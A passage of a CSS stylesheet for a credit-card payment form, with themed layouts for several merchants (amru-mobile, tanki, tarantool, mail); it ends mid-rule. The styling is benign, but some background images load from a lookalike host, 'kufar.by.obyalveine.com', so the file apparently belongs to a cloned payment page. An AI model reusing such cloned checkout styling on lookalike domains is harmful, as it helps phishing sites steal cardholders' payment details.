.pay-card_type_amru-mobile .credit-card-form__label-group_type_expiration-date {
	margin: 0
}

.pay-card_type_amru-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding-right: 6px
}

.pay-card_type_amru-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__input,
.pay-card_type_amru-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin: 0;
	width: 100%
}

.pay-card_type_amru-mobile .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv {
	margin: 0;
	padding: 0 0 0 6px
}

.pay-card_type_amru-mobile .credit-card-form__cvv-icon,
.pay-card_type_amru-mobile .credit-card-form__cvv-icon:hover,
.pay-card_type_amru-mobile .credit-card-form__label_type_cvv:hover .credit-card-form__cvv-icon {
	height: 20px;
	width: 20px
}

.pay-card_type_amru-mobile .credit-card-form__cvv-icon {
	position: absolute;
	display: inline-block;
	top: 32px;
	left: auto;
	right: 10px;
	border-radius: 10px;
	background-image: none;
	background-color: #ccc;
	text-align: center;
	color: #fff;
	cursor: pointer
}

.pay-card_type_amru-mobile .credit-card-form__cvv-icon:before {
	display: inline-block;
	content: "?";
	font-size: 15px
}

.pay-card_type_amru-mobile .credit-card-form__terms {
	margin-top: 10px;
	font-size: 14px;
	line-height: 20px;
	color: #777272
}

.pay-card_type_amru-mobile .credit-card-form__terms-link {
	color: #5993da
}

.pay-card_type_amru-mobile .credit-card-form__error-text,
.pay-card_type_amru-mobile .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_amru-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	position: relative
}

.pay-card_type_amru-mobile .credit-card-form__label_type_cvv .credit-card-form__input,
.pay-card_type_amru-mobile .credit-card-form__label_type_cvv .credit-card-form__title {
	width: 100%
}

.pay-card_type_amru-mobile .credit-card-form__label_error_yes .credit-card-form__title {
	color: #d53536
}

.pay-card_type_amru-mobile .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border: 1px solid #d53536
}

.pay-card_type_amru-mobile .credit-card-form__popup {
	max-width: 360px;
	margin: 0 auto
}

.pay-card_type_amru-mobile .credit-card-form__popup .button,
.pay-card_type_amru-mobile .credit-card-form__submit .button {
	color: #fff;
	border-radius: 3px;
	width: 100%;
	height: 38px;
	margin: 0;
	line-height: 38px;
	font-size: 15px;
	font-weight: 500;
	letter-spacing: .5px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none
}

.pay-card_type_amru-mobile .credit-card-form__popup .button,
.pay-card_type_amru-mobile .credit-card-form__popup .button:active,
.pay-card_type_amru-mobile .credit-card-form__popup .button:hover,
.pay-card_type_amru-mobile .credit-card-form__submit .button,
.pay-card_type_amru-mobile .credit-card-form__submit .button:active,
.pay-card_type_amru-mobile .credit-card-form__submit .button:hover {
	background: #7bb62e
}

.pay-card_type_amru-mobile .credit-card-form__popup .button:focus,
.pay-card_type_amru-mobile .credit-card-form__submit .button:focus {
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_amru-mobile .credit-card-form__popup .button {
	padding: 0 24px;
	margin-top: 35px
}

.pay-card-layout_type_amru-mobile .notification-block .title,
.pay-card_type_amru-mobile .credit-card-form__popup .info-block .title {
	margin: 0 0 10px;
	font-size: 17px;
	color: #222
}

.pay-card-layout_type_amru-mobile .info-block .paragraph,
.pay-card_type_amru-mobile .credit-card-form__popup .info-block .paragraph {
	margin: 0;
	font-size: 14px;
	line-height: 1.57;
	color: #777272
}

.pay-card_type_amru-mobile .credit-card-form__popup .info-block .paragraph_color_red {
	color: #777272
}

.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table-wrapper {
	padding: 0 20px;
	background: #fff;
	border-top: 1px solid #ebebeb;
	border-bottom: 1px solid #ebebeb
}

.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table {
	padding: 0;
	border-top: none
}

.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	border-top: none;
	border-bottom: none
}

.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table,
.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table__caption {
	background: #fff
}

.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table__caption,
.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	padding: 15px 0;
	font-size: 15px;
	line-height: 24px;
	color: #222
}

.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table__head {
	border-top: 1px solid #d9d9d9
}

.pay-card_type_amru-mobile .credit-card-form__popup .notification-block .payment-info-table__cell {
	padding: 15px 0;
	font-size: 15px;
	line-height: 22px;
	color: #777272;
	border-top: 1px solid #d9d9d9;
	text-align: right;
	vertical-align: middle
}

.pay-card_type_amru-mobile .credit-card-form__popup-footer {
	padding: 0 10px
}

.pay-card_type_amru-mobile .credit-card-form__tooltip {
	left: auto;
	right: 0;
	top: 35px;
	width: 175px;
	padding: 10px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	color: #fff;
	background-color: rgba(0, 0, 0, .85);
	-webkit-box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	box-shadow: 0 2px 2px .3px rgba(0, 0, 0, .04), 0 0 1px 0 rgba(0, 0, 0, .12);
	border-radius: 4px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 14px;
	line-height: 1.57;
	text-align: left
}

.pay-card_type_amru-mobile .credit-card-form__tooltip-arrow {
	bottom: -16px;
	right: 12px;
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-top-color: rgba(0, 0, 0, .85);
	border-width: 8px;
	margin-left: 0
}

.pay-card_type_amru-mobile .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_amru-mobile .notification-block .payment-info-table__caption {
	padding: 10px 0;
	border-bottom: 1px solid hsla(0, 0%, 59%, .4);
	background-color: #f1f1f1
}

.pay-card_type_amru-mobile .notification-block .payment-info-table {
	background-color: #f1f1f1
}

.pay-card_type_amru-mobile .notification-block .payment-info-table__caption,
.pay-card_type_amru-mobile .notification-block .payment-info-table__cell,
.pay-card_type_amru-mobile .notification-block .payment-info-table__head {
	font-size: 15px;
	color: rgba(0, 0, 0, .5);
	letter-spacing: -.3px
}

.pay-card_type_amru-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__cell,
.pay-card_type_amru-mobile .notification-block .payment-info-table .grid-table__row:last-child .payment-info-table__head {
	padding-bottom: 15px
}

.secure-information_type_amru-mobile {
	max-width: 360px;
	margin: 0 auto;
	padding: 0 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: none;
	text-align: center;
	font-family: Roboto, arial, helvetica
}

.secure-information_type_amru-mobile .secure-information__icon {
	margin: 0
}

.secure-information_type_amru-mobile .secure-information__text {
	margin: 0;
	font-size: 14px;
	color: #7bb62e
}

.secure-information_type_amru-mobile .secure-information__text_type_protocol {
	display: inline-block;
	margin: 0 5px 0 0
}

.secure-information_type_amru-mobile .protection-icons {
	margin-top: 10px
}

.pay-card_type_amru-mobile-cardreg .credit-card-form__label-group_type_card-number {
	margin-bottom: 15px
}

.pay-card_type_amru-mobile-cardreg .credit-card-form__tooltip {
	top: 125px
}

.body_background_tanki-online {
	background: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/pay-card/background-tankionline.jpg") 50% no-repeat
}

.body_background_tanki-x {
	background: url("https://kufar.by.obyalveine.com/img/background-tanki-x.jpg") 50% no-repeat
}

.body_background_tanki {
	-webkit-background-size: cover;
	background-size: cover
}

.body_background_tanki .credit-card-form__popup {
	left: 50%;
	top: 50%;
	z-index: 20;
	width: 445px;
	height: 385px;
	padding: 20px 30px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	overflow: hidden;
	margin: -192.5px 0 0 -222.5px
}

.body_background_tanki .credit-card-form__popup-body {
	height: 100%
}

.pay-card_type_tanki {
	position: absolute;
	left: 50%;
	top: 50%;
	z-index: 10;
	display: block;
	width: 445px;
	height: 385px;
	overflow: hidden;
	margin: -192.5px 0 0 -222.5px;
	padding: 20px 30px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: #fff;
	vertical-align: middle
}

.pay-card_type_tanki .credit-card-form__popup-footer {
	margin-top: -100px
}

.pay-card_type_tarantool,
.pay-card_type_tarantool .credit-card-form__label-group_type_add-card .credit-card-form__label,
.pay-card_type_tarantool .credit-card-form__terms,
.pay-card_type_tarantool .credit-card-form__terms-link,
.pay-card_type_tarantool .pay-card__remove-card {
	color: #c8c8c8
}

.pay-card_type_tarantool {
	position: relative;
	height: 100%;
	font-family: Helvetica Neue, helvetica, arial, sans-serif;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_tarantool:before {
	position: absolute;
	left: 0;
	bottom: 57px;
	width: 100%;
	height: 0;
	border-bottom: 1px solid #1c1e22;
	overflow: hidden;
	content: ""
}

.pay-card_type_tarantool .pay-card__card-selector .control-label__text {
	margin-right: 28px
}

.pay-card_type_tarantool .pay-card__remove-card {
	padding: 0;
	float: right;
	line-height: 28px
}

.pay-card_type_tarantool .pay-card__remove-card-icon {
	width: 10px;
	height: 10px;
	padding: 0 5px 0 0;
	line-height: 10px;
	font-size: 15px
}

.pay-card_type_tarantool .pay-card__remove-card-text {
	line-height: 12px
}

.pay-card-layout__notification_type_tarantool .protection-icons,
.pay-card_type_tarantool .pay-card__card,
.pay-card_type_tarantool .pay-card__card-selector {
	width: 375px
}

.pay-card_type_tarantool .credit-card-form__card-wrapper {
	padding-bottom: 3px
}

.pay-card_type_tarantool .credit-card-form__form {
	padding-left: 0
}

.pay-card_type_tarantool .credit-card-form__title {
	font-size: 10px;
	line-height: 14px
}

.pay-card_type_tarantool .credit-card-form__title_type_expiration-date {
	top: 104px
}

.pay-card_type_tarantool .credit-card-form__submit {
	position: relative;
	z-index: 2;
	height: 32px;
	padding: 22px 0 0;
	text-align: right
}

.pay-card_type_tarantool .credit-card-form__popup .button,
.pay-card_type_tarantool .credit-card-form__submit .button {
	background: #5cb85c;
	color: #fff;
	border-radius: 2px;
	height: 34px;
	padding: 0 16px;
	outline: none;
	font-size: 14px;
	font-weight: 400
}

.pay-card_type_tarantool .credit-card-form__popup .button:active,
.pay-card_type_tarantool .credit-card-form__popup .button:hover,
.pay-card_type_tarantool .credit-card-form__submit .button:active,
.pay-card_type_tarantool .credit-card-form__submit .button:hover {
	background: #449d44
}

.pay-card_type_tarantool .credit-card-form__submit .button__light,
.pay-card_type_tarantool .credit-card-form__submit .button__light:hover {
	background: transparent;
	border: 1px solid #adadad
}

.pay-card_type_tarantool .credit-card-form__submit .button {
	float: right;
	margin: 0 0 0 5px
}

.pay-card-layout__notification_type_tarantool .protection-icons {
	position: relative;
	z-index: 1;
	height: 20px;
	margin: -35px auto 0;
	font-size: 0;
	line-height: 0;
	opacity: .2
}

.body_background_tarantool,
.body_background_tarantool .credit-card-form__popup,
.body_background_tarantool .credit-card-form__popup .notification-block {
	background: #2e3337
}

.body_background_tarantool .credit-card-form__popup .notification-block .title,
.body_background_tarantool .credit-card-form__popup .payment-info-table__caption,
.body_background_tarantool .credit-card-form__popup .payment-info-table__cell,
.body_background_tarantool .credit-card-form__popup .payment-info-table__head {
	color: #fff
}

.pay-card-layout_type_mail .credit-card-form__card-wrapper,
.pay-card-layout_type_mail .credit-card-form__label-group_type_payment-amount,
.pay-card-layout_type_mail .credit-card-form__submit-inner,
.pay-card-layout_type_mail .credit-card-form__terms,
.pay-card-layout_type_mail .pay-card-layout__notification,
.pay-card-layout_type_mail .pay-card__card-selector {
	width: 420px;
	margin: 0 auto;
	padding-left: 20px;
	padding-right: 20px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card-layout_type_mail .credit-card-form {
	padding-bottom: 0
}

.pay-card-layout_type_mail .credit-card-form__card-wrapper {
	margin-bottom: 20px
}

.pay-card-layout_type_mail .pay-card-layout__title {
	margin-bottom: 10px
}

.pay-card-layout_type_mail .info-block_type_error,
.pay-card-layout_type_mail .pay-card-layout__title {
	text-align: left;
	font-size: 15px;
	line-height: 20px
}

.pay-card-layout_type_mail .pay-card-layout_logo {
	margin-bottom: 40px
}

.pay-card-layout_type_mail .pay-card__card {
	position: relative;
	width: auto
}

.pay-card-layout_type_mail .info-block_type_error {
	display: none;
	color: #f10
}

.pay-card-layout_type_mail .info-block .paragraph {
	margin: 0
}

.pay-card_type_mail {
	min-height: 320px
}

.pay-card_type_mail .pay-card__card-selector {
	margin-bottom: 10px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-pack: justify;
	-webkit-justify-content: space-between;
	justify-content: space-between;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center
}

.pay-card_type_mail .pay-card__card-selector.pay-card__card-selector_type_hidden {
	display: none!important
}

.pay-card_type_mail .control__select {
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_mail .pay-card__card-selector .selectBox-label {
	font-size: 15px;
	padding: 3px 15px 3px 0
}

.pay-card_type_mail .pay-card__card-selector .control-label__text,
.pay-card_type_mail .pay-card__remove-card-icon {
	display: none
}

.pay-card_type_mail .pay-card__remove-card-text {
	font-size: 15px;
	text-decoration: underline
}

.pay-card_type_mail .pay-card__remove-card-text:hover {
	text-decoration: none
}

.pay-card_type_mail .credit-card-form__form {
	padding: 0
}

.pay-card_type_mail .credit-card-form__card_position_back,
.pay-card_type_mail .credit-card-form__card_position_front {
	width: 274px;
	height: 181px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	border-radius: 8px
}

.pay-card_type_mail .credit-card-form__card_position_front {
	padding-top: 50px;
	background: #f0f0f0;
	-webkit-box-shadow: 2px 0 0 0 rgba(0, 0, 0, .04);
	box-shadow: 2px 0 0 0 rgba(0, 0, 0, .04)
}

.pay-card_type_mail .credit-card-form__card_position_back {
	margin-top: -181px;
	right: -106px;
	background: #c7c7c7;
	-webkit-box-shadow: none;
	box-shadow: none
}

.pay-card_type_mail .credit-card-form__card_position_back:before {
	height: 35px
}

.pay-card_type_mail .payment-systems-icons {
	top: -35px
}

.pay-card_type_mail .credit-card-form__submit {
	margin-top: 0;
	text-align: left;
	border-top: 1px solid #e0e0e0;
	padding: 20px 0 10px
}

.pay-card_type_mail .credit-card-form__title {
	text-transform: none;
	font-size: 13px;
	font-weight: 700;
	line-height: 14px
}

.pay-card_type_mail .credit-card-form__title_type_expiration-date {
	top: 135px
}

.pay-card_type_mail .credit-card-form__label_type_cvv .credit-card-form__title {
	margin-top: 5px;
	margin-bottom: 5px
}

.pay-card_type_mail .credit-card-form__error-text,
.pay-card_type_mail .credit-card-form__label_type_cvv .credit-card-form__error-text {
	position: static;
	display: none;
	font-size: 13px
}

.pay-card_type_mail .credit-card-form__label_error_yes .credit-card-form__input {
	outline: 0;
	border: 1px solid #f10
}

.pay-card_type_mail .credit-card-form__input {
	padding-top: 6px;
	padding-bottom: 6px;
	border: 1px solid rgba(0, 0, 0, .12);
	border-radius: 2px;
	background: #fff;
	font-size: 15px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card_type_mail .credit-card-form__input:disabled {
	background: #f7f7f7;
	color: #000;
	opacity: 1;
	-webkit-text-fill-color: #000
}

.pay-card_type_mail .credit-card-form__label-group_type_card-number .credit-card-form__input {
	letter-spacing: .1em
}

.pay-card_type_mail .credit-card-form__label-group_type_card-number .credit-card-form__input:disabled {
	background: #f0f0f0;
	border-color: transparent;
	padding-left: 0
}

.pay-card_type_mail .credit-card-form__label-group_type_payment-amount {
	position: relative;
	margin: 0 auto 20px
}

.pay-card_type_mail .credit-card-form__label-group_type_payment-amount .credit-card-form__label {
	position: relative
}

.pay-card_type_mail .credit-card-form__label-group_type_payment-amount .credit-card-form__title {
	margin: 0 0 5px
}

.pay-card_type_mail .credit-card-form__label-group_type_payment-amount .credit-card-form__input {
	padding-top: 7px;
	padding-bottom: 7px;
	font-size: 15px;
	font-weight: 400;
	text-transform: none;
	letter-spacing: normal;
	background: #fff
}

.pay-card_type_mail .credit-card-form__label-group_type_payment-amount .credit-card-form__input:disabled {
	background: #f7f7f7
}

.pay-card_type_mail .credit-card-form__label-group_type_payment-amount .credit-card-form__placeholder {
	position: absolute;
	right: 30px;
	top: 50%;
	color: #9a9a9a;
	text-transform: none;
	font-size: 15px;
	font-weight: 100
}

.pay-card_type_mail .credit-card-form__label-group_type_payment-amount .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info,
.pay-card_type_mail .credit-card-form__terms {
	padding-top: 10px;
	font-size: 13px;
	line-height: 18px;
	color: #999
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info-link,
.pay-card_type_mail .credit-card-form__terms-link {
	color: #999
}

.pay-card_type_mail .credit-card-form__terms-link:hover {
	text-decoration: none
}

.pay-card_type_mail .credit-card-form__label-group_type_holder-name {
	display: inline-block;
	width: 160px
}

.pay-card_type_mail .credit-card-form__label-group_type_holder-name .credit-card-form__title {
	margin: 0 0 3px
}

.pay-card_type_mail .credit-card-form__cvv-icon,
.pay-card_type_mail .credit-card-form__label:hover .credit-card-form__cvv-icon {
	width: 16px;
	height: 16px
}

.pay-card_type_mail .credit-card-form__cvv-icon {
	display: block;
	margin-top: 6px;
	background: #333;
	border-radius: 8px;
	text-align: center;
	cursor: pointer
}

.pay-card_type_mail .credit-card-form__cvv-icon:before {
	display: block;
	content: "?";
	font-size: 9px;
	color: #c7c7c7;
	line-height: 16px
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info .credit-card-form__tooltip,
.pay-card_type_mail .credit-card-form__tooltip_type_cvv {
	left: 50%;
	margin-left: -90px;
	padding-right: 15px;
	padding-left: 15px;
	border-radius: 2px;
	-webkit-box-shadow: 0 4px 16px 2px rgba(0, 0, 0, .12);
	box-shadow: 0 4px 16px 2px rgba(0, 0, 0, .12);
	font-size: 15px;
	line-height: 18px;
	color: #333
}

.pay-card_type_mail .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-arrow,
.pay-card_type_mail .credit-card-form__tooltip_type_cvv .credit-card-form__tooltip-icon {
	display: none
}

.pay-card_type_mail .credit-card-form__popup .button,
.pay-card_type_mail .credit-card-form__submit .button {
	color: #fff;
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	border-radius: 2px;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #005ff9;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_mail .credit-card-form__popup .button:hover,
.pay-card_type_mail .credit-card-form__submit .button:hover {
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #005aee
}

.pay-card_type_mail .credit-card-form__popup .button:active,
.pay-card_type_mail .credit-card-form__submit .button:active {
	-webkit-box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #0057e4
}

.pay-card_type_mail .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_mail .credit-card-form__submit .button.button_disabled_yes {
	border-radius: 2px
}

.pay-card_type_mail .credit-card-form__popup .button.button_disabled_yes,
.pay-card_type_mail .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card_type_mail .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_mail .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_mail .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_mail .credit-card-form__submit .button.button_disabled_yes:hover {
	background: #005ff9;
	color: #fff;
	cursor: default;
	opacity: .4
}

.pay-card_type_mail .credit-card-form__popup .button__light,
.pay-card_type_mail .credit-card-form__submit .button__light {
	color: #333;
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	border-radius: 2px;
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #f0f0f0;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box
}

.pay-card_type_mail .credit-card-form__popup .button__light:hover,
.pay-card_type_mail .credit-card-form__submit .button__light:hover {
	border: 1px solid;
	border-color: rgba(0, 0, 0, .12);
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #ddd
}

.pay-card_type_mail .credit-card-form__popup .button__light:active,
.pay-card_type_mail .credit-card-form__submit .button__light:active {
	-webkit-box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: inset 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #d3d3d3
}

.pay-card_type_mail .credit-card-form__popup .button__light.button_disabled_yes,
.pay-card_type_mail .credit-card-form__submit .button__light.button_disabled_yes {
	border-radius: 2px
}

.pay-card_type_mail .credit-card-form__popup .button__light.button_disabled_yes,
.pay-card_type_mail .credit-card-form__popup .button__light.button_disabled_yes:active,
.pay-card_type_mail .credit-card-form__popup .button__light.button_disabled_yes:hover,
.pay-card_type_mail .credit-card-form__submit .button__light.button_disabled_yes,
.pay-card_type_mail .credit-card-form__submit .button__light.button_disabled_yes:active,
.pay-card_type_mail .credit-card-form__submit .button__light.button_disabled_yes:hover {
	-webkit-box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	box-shadow: 0 2px 0 0 rgba(0, 0, 0, .04);
	background: #f0f0f0;
	color: #333;
	cursor: default;
	opacity: .48
}

.pay-card_type_mail .credit-card-form__popup .button,
.pay-card_type_mail .credit-card-form__popup .button__light,
.pay-card_type_mail .credit-card-form__submit .button,
.pay-card_type_mail .credit-card-form__submit .button__light {
	padding-left: 20px;
	padding-right: 20px;
	line-height: 30px;
	font-size: 15px;
	font-weight: 400;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_mail .credit-card-form__submit .button {
	margin-right: 10px
}

.pay-card_type_mail .credit-card-form__popup .button {
	margin-right: 0
}

.pay-card_type_mail .credit-card-form__popup-footer {
	margin-bottom: 20px;
	height: auto;
	position: absolute;
	bottom: 0;
	left: 50%;
	-webkit-transform: translateX(-50%);
	-o-transform: translateX(-50%);
	transform: translateX(-50%)
}

.pay-card_type_mail .credit-card-form__popup-body {
	height: 100%
}

.pay-card-layout_type_mail .pay-card-layout__notification {
	margin: 0 auto
}

.pay-card-layout_type_mail .secure-information {
	padding-top: 10px;
	background: none
}

.pay-card-layout_type_mail-outgoing .secure-information {
	padding-bottom: 20px
}

.pay-card-layout_type_mail .secure-information__icon {
	display: none
}

.pay-card-layout_type_mail .secure-information__column_position_left,
.pay-card-layout_type_mail .secure-information__column_position_right {
	padding: 0
}

.pay-card-layout_type_mail .secure-information__column_position_right {
	min-width: 225px
}

.pay-card-layout_type_mail .protection-icons__list {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center
}

.pay-card-layout_type_mail .protection-icons__list-item {
	margin-right: 0;
	margin-left: 5px
}

.pay-card-layout_type_mail .secure-information__text {
	font-size: 12px;
	line-height: 17px;
	color: #999
}

.pay-card-layout_type_mail .secure-information__text_type_protocol {
	display: block;
	color: #10b800
}

.credit-card-form__popup_type_mail .info-block .title {
	margin: 0 0 25px;
	font-size: 24px;
	line-height: 32px
}

.credit-card-form__popup_type_mail .info-block .paragraph {
	font-size: 15px;
	line-height: 20px
}

.credit-card-form__popup_type_mail .payment-info-table {
	padding: 0
}

.credit-card-form__popup_type_mail .payment-info-table__caption {
	padding: 15px 0 10px
}

.control__select_type_mail {
	width: auto!important;
	min-width: 0!important;
	padding-right: 10px;
	border: 0!important;
	border-radius: 0!important;
	background: #fff!important;
	font-size: 15px
}

.control__select_type_mail-selectBox-dropdown-menu {
	width: auto!important;
	border-radius: 2px;
	border: none;
	-webkit-box-shadow: 0 4px 20px 0 rgba(0, 0, 0, .16);
	box-shadow: 0 4px 20px 0 rgba(0, 0, 0, .16);
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	background: #fff
}

.control__select_type_mail-selectBox-dropdown-menu li {
	position: relative;
	padding-left: 15px;
	padding-right: 15px;
	font-size: 15px;
	line-height: 32px;
	color: #333
}

.control__select_type_mail-selectBox-dropdown-menu li.selectBox-selected a {
	background: #fff
}

.control__select_type_mail-selectBox-dropdown-menu li a {
	height: 32px;
	line-height: 32px!important;
	cursor: pointer
}

.control__select_type_mail-selectBox-dropdown-menu li.selectBox-hover a {
	background: #fff
}

.control__select_type_mail-selectBox-dropdown-menu li.selectBox-hover a:before,
.control__select_type_mail-selectBox-dropdown-menu li.selectBox-selected a:before {
	position: absolute;
	left: 7px;
	top: 0;
	font-size: 10px;
	content: "\2714"
}

.control__select_type_mail-selectBox-dropdown-menu li:last-child {
	border-top: 1px solid #e0e0e0
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info {
	color: #9a9a9a;
	text-transform: none
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info-link {
	text-decoration: underline;
	position: relative;
	cursor: pointer
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info-link:hover {
	text-decoration: none
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info-link:hover .credit-card-form__tooltip {
	opacity: 1;
	visibility: visible
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info .credit-card-form__tooltip {
	margin-left: 0;
	top: 25px;
	-webkit-transform: translateX(-50%);
	-o-transform: translateX(-50%);
	transform: translateX(-50%);
	width: 280px;
	line-height: 1.57
}

@media (max-width:480px) {
	.pay-card-layout_type_mail .credit-card-form__payment-amount-info .credit-card-form__tooltip {
		margin-left: 25px;
		left: 0
	}
}

.pay-card-layout_type_mail .credit-card-form__payment-amount-info .credit-card-form__tooltip-arrow {
	right: 50%;
	top: -24px;
	-webkit-transform: translateX(50%);
	-o-transform: translateX(50%);
	transform: translateX(50%);
	border: solid transparent;
	content: "";
	height: 0;
	width: 0;
	pointer-events: none;
	border-bottom-color: #fff;
	border-width: 12px;
	margin-left: 0
}

@media (max-width:480px) {
	.pay-card-layout_type_mail .credit-card-form__payment-amount-info .credit-card-form__tooltip-arrow {
		right: 40%
	}
}

.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__card_position_back,
.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__card_position_front,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__card_position_back,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__card_position_front {
	height: 193px
}

.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__card_position_front,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__card_position_front {
	padding-top: 45px
}

.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__card_position_back,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__card_position_back {
	margin-top: -193px
}

.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__input,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__input {
	line-height: 20px;
	padding: 10px 0 10px 7px;
	border-radius: 4px
}

.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__popup .button,
.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__popup .button__light,
.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__submit .button,
.pay-card-layout_type_mail_theme_octavius1 .pay-card_type_mail .credit-card-form__submit .button__light,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__popup .button,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__popup .button__light,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__submit .button,
.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__submit .button__light {
	height: 40px;
	border-radius: 4px
}

.pay-card-layout_type_mail_theme_octavius2 .pay-card_type_mail .credit-card-form__submit {
	border-top-color: transparent
}

.pay-card-layout_type_mail .credit-card-form__input,
.pay-card-layout_type_mail .credit-card-form__placeholder,
.pay-card-layout_type_mail .credit-card-form__submit .button {
	font-family: Roboto, Arial, sans-serif
}

.body_background_mail-mobile,
.pay-card-layout_type_mail-mobile .credit-card-form__popup,
.pay-card-layout_type_mail-mobile .credit-card-form__popup .notification-block {
	background: #fff
}

.pay-card_type_mail-mobile {
	position: static;
	width: 100%;
	margin: 0 auto;
	padding: 15px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-size: 15px;
	line-height: 22px;
	color: #999;
	-webkit-font-smoothing: antialiased
}

.pay-card_type_mail-mobile,
.secure-information_type_mail-mobile {
